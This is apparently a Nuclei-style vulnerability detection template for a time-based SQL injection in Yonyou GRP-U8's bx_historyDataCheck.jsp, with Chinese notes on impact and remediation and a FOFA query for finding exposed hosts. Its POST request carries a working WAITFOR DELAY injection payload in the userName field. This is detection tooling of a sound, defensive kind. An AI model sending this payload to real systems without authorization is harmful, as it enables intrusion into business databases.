id: yonyou-u8-sqli

info:
  name: Yonyou U8 bx_historyDataCheck - SQL 注入漏洞
  author: xianke
  severity: high
  description: |
    该模板用于检测 Yonyou U8 bx_historyDataCheck - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/login.jsp` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/yonyou-grp-u8-bx_historyDataChecks-sqli.yaml
    - https://github.com/MD-SEC/MDPOCS/blob/main/Yongyou_Grp_U8_bx_historyDataCheck_Sql_Poc.py
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="-299520369"
  tags: time-based-sqli,yonyou,grp,sqli,vuln

flow: http(1) && http(2)


http:
  - raw:
      - |
        GET /login.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - 'GRP-U8'
        internal: true

  - raw:
      - |
        @timeout: 20s
        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userName='%3bWAITFOR+DELAY+'0%3a0%3a5'--%26ysnd%3d%26historyFlag%3d

    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'contains(content_type, "text/html")'
        condition: and
